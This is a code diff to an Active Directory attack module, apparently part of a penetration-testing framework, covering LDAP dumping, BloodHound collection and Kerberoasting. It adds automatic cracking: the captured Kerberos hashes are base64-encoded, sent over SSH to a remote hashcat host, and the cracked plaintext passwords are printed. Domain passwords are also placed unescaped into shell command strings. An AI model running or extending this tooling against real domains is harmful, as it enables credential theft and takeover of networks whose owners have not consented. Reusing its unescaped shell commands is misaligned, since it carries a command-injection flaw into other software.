@@ -48,7 +48,7 @@ class ADEnumerateAll(ModuleBase):
         self.register_option("USER", "Domain username", required=True)
         self.register_option("PASS", "Domain password", required=True)
         self.register_option("OUTPUT_DIR", "Output directory for all results",
-                           default="./ad_enum_results")
+                           default="ad_enum_results")
 
         # What to enumerate
         self.register_option("ENUM_LDAP", "Run LDAP enumeration", default="yes",
@@ -76,8 +76,15 @@ class ADEnumerateAll(ModuleBase):
         self.register_option("ENUM_ADCS", "Enumerate AD CS vulnerabilities (Certipy)", default="yes",
                            choices=["yes", "no"])
 
-        # Container option for Exegol
-        self.register_option("EXEGOL_CONTAINER", "Exegol container (auto-detect if empty)", default="")
+
+        # Auto-crack options
+        self.register_option("AUTO_CRACK", "Automatically crack captured hashes",
+                           default="yes", choices=["yes", "no"])
+        self.register_option("SSH_HOST", "SSH host for hashcat cracking", default="omarchy")
+        self.register_option("SSH_USER", "SSH username (empty = current user)", default="")
+        self.register_option("SSH_PORT", "SSH port", default=22)
+        self.register_option("WORDLIST", "Wordlist path on remote host", default="$HOME/tools/rockyou.txt")
+        self.register_option("RULES", "Rules file on remote host (optional)", default="")
 
         # Privileged groups to check
         self.privileged_groups = [
@@ -105,7 +112,12 @@ class ADEnumerateAll(ModuleBase):
         domain = self.get_option("DOMAIN")
         user = self.get_option("USER")
         password = self.get_option("PASS")
-        output_dir = self.get_option("OUTPUT_DIR")
+        output_dir_raw = self.get_option("OUTPUT_DIR")
+        # Resolve path using WORKING_DIR (e.g., /workspace)
+        if self._config:
+            output_dir = self._config.resolve_path(output_dir_raw)
+        else:
+            output_dir = os.path.abspath(output_dir_raw)
 
         self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
 
@@ -229,48 +241,90 @@ class ADEnumerateAll(ModuleBase):
 
     def _run_ldap_enum(self, dc_ip: str, domain: str, user: str, password: str,
                        base_dn: str, output_dir: str) -> bool:
-        """Run comprehensive LDAP enumeration"""
+        """Run comprehensive LDAP enumeration using ldapdomaindump"""
         self.print_line()
         self.print_status("[1/9] LDAP Enumeration")
         self.print_line("-" * 50)
 
+        ldap_output = os.path.join(output_dir, "ldap")
+        os.makedirs(ldap_output, exist_ok=True)
+
+        # Use ldapdomaindump - more reliable than raw ldapsearch
+        cmd = f"ldapdomaindump -u '{domain}\\{user}' -p '{password}' ldap://{dc_ip} -o {ldap_output}"
+
+        # Try local first, then Exegol
+        tool_path = find_tool("ldapdomaindump")
+        if tool_path:
+            self.print_status("  Using local ldapdomaindump...")
+            ret, stdout, stderr = self._run_cmd(
+                [tool_path, "-u", f"{domain}\\{user}", "-p", password,
+                 f"ldap://{dc_ip}", "-o", ldap_output],
+                timeout=120
+            )
+        else:
+            self.print_status("  Using Exegol ldapdomaindump...")
+            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)
+
+        output_text = stdout + stderr
+
+        if ret == 0 or "Writing" in output_text or os.path.exists(os.path.join(ldap_output, "domain_users.json")):
+            self.print_good("  LDAP enumeration complete")
+
+            # List generated files
+            try:
+                files = os.listdir(ldap_output)
+                file_types = {
+                    "domain_users": "users",
+                    "domain_computers": "computers",
+                    "domain_groups": "groups",
+                    "domain_policy": "domain_info",
+                    "domain_trusts": "trusts",
+                }
+                for prefix, name in file_types.items():
+                    if any(f.startswith(prefix) for f in files):
+                        self.print_good(f"    {name}: OK")
+                        self.results[f'ldap_{name}'] = True
+            except:
+                pass
+
+            self.results['ldap'] = "ldapdomaindump complete"
+            return True
+
+        # Fallback to individual ldapsearch queries if ldapdomaindump fails
+        self.print_warning("  ldapdomaindump failed, trying ldapsearch...")
+        return self._run_ldap_fallback(dc_ip, domain, user, password, base_dn, output_dir)
+
+    def _run_ldap_fallback(self, dc_ip: str, domain: str, user: str, password: str,
+                           base_dn: str, output_dir: str) -> bool:
+        """Fallback LDAP enumeration using ldapsearch"""
         queries = {
-            "domain_info": ("(objectClass=domain)", "distinguishedName name dc ms-DS-MachineAccountQuota"),
-            "domain_controllers": ("(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
-                                   "cn dNSHostName operatingSystem"),
-            "users": ("(&(objectClass=user)(!(objectClass=computer)))",
-                     "sAMAccountName userPrincipalName description memberOf userAccountControl adminCount"),
-            "computers": ("(objectClass=computer)",
-                         "cn dNSHostName operatingSystem operatingSystemVersion description userAccountControl"),
-            "groups": ("(objectClass=group)", "cn description member managedBy adminCount"),
-            "ous": ("(objectClass=organizationalUnit)", "name description"),
-            "spn_users": ("(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))",
-                         "sAMAccountName servicePrincipalName memberOf"),
-            "asrep_users": ("(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
-                           "sAMAccountName userAccountControl"),
+            "domain_info": "(objectClass=domain)",
+            "domain_controllers": "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
+            "users": "(&(objectClass=user)(!(objectClass=computer)))",
+            "computers": "(objectClass=computer)",
+            "groups": "(objectClass=group)",
+            "ous": "(objectClass=organizationalUnit)",
+            "spn_users": "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))",
+            "asrep_users": "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
         }
 
         results = {}
-        for name, (ldap_filter, attrs) in queries.items():
-            cmd = [
-                "ldapsearch", "-x",
-                "-H", f"ldap://{dc_ip}",
-                "-D", f"{user}@{domain}",
-                "-w", password,
-                "-b", base_dn,
-                ldap_filter, attrs
-            ]
+        for name, ldap_filter in queries.items():
+            # Use Exegol for ldapsearch too
+            cmd = (f"ldapsearch -x -H ldap://{dc_ip} "
+                   f"-D '{user}@{domain}' -w '{password}' "
+                   f"-b '{base_dn}' '{ldap_filter}'")
 
-            ret, stdout, stderr = self._run_cmd(cmd)
+            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
 
-            if ret == 0:
+            if ret == 0 and stdout.strip():
                 results[name] = stdout
                 output_file = os.path.join(output_dir, f"ldap_{name}_{self.timestamp}.txt")
                 with open(output_file, 'w') as f:
                     f.write(stdout)
-                self.print_good(f"  {name}: OK")
+                self.print_good(f"    {name}: OK")
             else:
-                self.print_warning(f"  {name}: Failed")
+                self.print_warning(f"    {name}: Failed")
 
         self.results['ldap'] = results
         return len(results) > 0
@@ -510,38 +564,56 @@ class ADEnumerateAll(ModuleBase):
         self.print_status("[6/9] BloodHound Collection")
         self.print_line("-" * 50)
 
-        bh_path = find_tool("bloodhound-python") or find_tool("bloodhound.py")
-        if not bh_path:
-            self.print_warning("  bloodhound-python not found, skipping")
-            return False
-
         bh_output = os.path.join(output_dir, "bloodhound")
         os.makedirs(bh_output, exist_ok=True)
 
-        cmd = [
-            bh_path,
-            "-u", user,
-            "-p", password,
-            "-d", domain,
-            "-dc", dc_ip,
-            "-ns", dc_ip,
-            "-c", "all",
-            "--output-dir", bh_output,
-            "--zip"
-        ]
+        # Try local first, then Exegol
+        bh_path = find_tool("bloodhound-python") or find_tool("bloodhound.py")
+        if bh_path:
+            # Local execution - use list for subprocess
+            cmd_list = [
+                bh_path,
+                "-u", user,
+                "-p", password,
+                "-d", domain,
+                "-ns", dc_ip,
+                "-c", "all",
+                "--zip",
+                "-op", f"{bh_output}/"
+            ]
+            # Show command (hide password)
+            display_cmd = f"bloodhound-python -u {user} -p [HIDDEN] -d {domain} -ns {dc_ip} -c all --zip -op {bh_output}/"
+            self.print_status(f"  Command: {display_cmd}")
+            self.print_status("  Running collection (this may take a while)...")
+            ret, stdout, stderr = self._run_cmd(cmd_list, timeout=600)
+            output_text = stdout + stderr
+        else:
+            # Exegol execution - build command string
+            cmd = (f"bloodhound-python "
+                   f"-u {user} "
+                   f"-p '{password}' "
+                   f"-d {domain} "
+                   f"-ns {dc_ip} "
+                   f"-c all --zip")
+            # Show command (hide password)
+            display_cmd = f"bloodhound-python -u {user} -p [HIDDEN] -d {domain} -ns {dc_ip} -c all --zip"
+            self.print_status(f"  Command: {display_cmd}")
+            self.print_status("  Running collection (this may take a while)...")
+            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=600)
+            output_text = stdout + stderr
 
-        self.print_status("  Running collection (this may take a while)...")
-        ret, stdout, stderr = self._run_cmd(cmd, timeout=600)
-
-        if ret == 0 or "Done" in stderr:
+        if ret == 0 or "done" in output_text.lower():
             self.print_good("  BloodHound collection complete")
-            for f in os.listdir(bh_output):
-                if f.endswith('.zip'):
-                    self.print_good(f"    Output: {f}")
+            try:
+                for f in os.listdir(bh_output):
+                    if f.endswith('.zip'):
+                        self.print_good(f"    Output: {f}")
+            except:
+                pass
             self.results['bloodhound'] = "Collection complete"
             return True
 
-        self.print_warning(f"  BloodHound collection failed: {stderr[:100]}")
+        self.print_warning(f"  BloodHound collection failed: {stderr[:100] if stderr else 'unknown error'}")
         return False
 
     def _run_kerberoast(self, dc_ip: str, domain: str, user: str,
@@ -571,7 +643,18 @@ class ADEnumerateAll(ModuleBase):
                 hash_count = sum(1 for line in open(output_file) if line.strip())
                 self.print_line(f"  {Colors.HIGH}►{Colors.RESET} {Colors.HIGH}KERBEROASTABLE USERS FOUND!{Colors.RESET}")
                 self.print_line(f"    {Colors.HASH} {hash_count} TGS hashes captured {Colors.RESET}")
-                self.print_line(f"    {Colors.BRIGHT_GREEN}Crack:{Colors.RESET} hashcat -m 13100 {output_file} wordlist.txt")
+
+                # Auto-crack if enabled - use hashcrack module
+                if self.get_option("AUTO_CRACK") == "yes":
+                    self.print_line(f"    {Colors.BRIGHT_CYAN}Auto-cracking via hashcrack module...{Colors.RESET}")
+                    cracked = self._run_hashcrack(output_file, "13100")
+                    if cracked:
+                        self.print_line(f"    {Colors.CRITICAL}!! CRACKED PASSWORDS:{Colors.RESET}")
+                        for pw in cracked:
+                            self.print_line(f"       {Colors.BRIGHT_GREEN}{pw}{Colors.RESET}")
+                        self.results['cracked_kerberoast'] = cracked
+                else:
+                    self.print_line(f"    {Colors.BRIGHT_GREEN}Crack:{Colors.RESET} hashcat -m 13100 {output_file} wordlist.txt")
             else:
                 self.print_line(f"  {Colors.DIM}No Kerberoastable users found{Colors.RESET}")
             self.results['kerberoast'] = stdout
@@ -579,6 +662,55 @@ class ADEnumerateAll(ModuleBase):
 
         self.print_line(f"  {Colors.DIM}Kerberoasting failed{Colors.RESET}")
         return False
+
+    def _run_hashcrack(self, hash_file: str, hash_type: str) -> list:
+        """Run hashcrack module to crack hashes on host"""
+        try:
+            from modules.auxiliary.cracking.hashcrack import HashCrack
+
+            cracker = HashCrack()
+            cracker.set_config(self._config)
+
+            # Set options from our config
+            cracker.set_option("HASHFILE", hash_file)
+            cracker.set_option("HASHTYPE", hash_type)
+            cracker.set_option("SSH_HOST", self.get_option("SSH_HOST"))
+            cracker.set_option("SSH_USER", self.get_option("SSH_USER"))
+            cracker.set_option("SSH_PORT", self.get_option("SSH_PORT"))
+            cracker.set_option("WORDLIST", self.get_option("WORDLIST"))
+            cracker.set_option("RULES", self.get_option("RULES"))
+            cracker.set_option("SHOW_ONLY", "no")
+
+            # Run the module
+            cracker.run()
+
+            # Try to get cracked results by running --show
+            ssh_host = self.get_option("SSH_HOST")
+            ssh_user = self.get_option("SSH_USER")
+            ssh_port = self.get_option("SSH_PORT")
+            ssh_target = f"{ssh_user}@{ssh_host}" if ssh_user else ssh_host
+            ssh_opts = f"-o StrictHostKeyChecking=accept-new -o BatchMode=yes -p {ssh_port}"
+
+            # Get cracked passwords
+            import base64
+            with open(hash_file, 'r') as f:
+                hashes = f.read().strip()
+            encoded = base64.b64encode(hashes.encode()).decode()
+
+            show_cmd = f"ssh {ssh_opts} {ssh_target} 'echo {encoded} | base64 -d | hashcat -m {hash_type} --show 2>/dev/null'"
+            result = subprocess.run(show_cmd, shell=True, capture_output=True, text=True, timeout=30)
+
+            cracked = []
+            for line in result.stdout.strip().split('\n'):
+                if ':' in line and line.strip():
+                    parts = line.rsplit(':', 1)
+                    if len(parts) == 2 and parts[1]:
+                        cracked.append(parts[1])
+            return cracked
+
+        except Exception as e:
+            self.print_line(f"    {Colors.DIM}Hashcrack failed: {e}{Colors.RESET}")
+            return []
 
     def _run_asreproast(self, dc_ip: str, domain: str, user: str,
                         password: str, output_dir: str) -> bool:
